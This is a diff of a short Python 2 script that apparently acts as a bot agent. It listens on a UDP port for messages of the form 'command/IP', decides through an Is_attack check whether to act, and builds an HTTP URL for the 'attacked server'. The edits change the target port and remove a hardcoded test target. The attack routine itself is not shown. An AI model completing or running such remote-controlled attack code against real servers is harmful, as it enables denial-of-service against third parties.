@@ -12,18 +12,21 @@ def Is_attack(msg):
     elif (msg == 'B'):
         return False
 
-attackedServerPort = 9000
+attackedServerPort = 8000
 serverPort = 12000
 serverSocket = socket(AF_INET,SOCK_DGRAM)
 hostName = gethostbyname('0.0.0.0')
 serverSocket.bind((hostName,serverPort))
-entence, addr = serverSocket.recvfrom(1024)
-sentence = "S/192.168.43.212:8000"
+sentence, addr = serverSocket.recvfrom(1024)
+
+print sentence
 
 command = sentence.split('/')[0]
 IP = sentence.split('/')[1]
 
-IP = 'http://' + IP
+
+IP = 'http://' + IP + ':' + str(attackedServerPort)
+
 print IP
 if Is_attack(command):
 
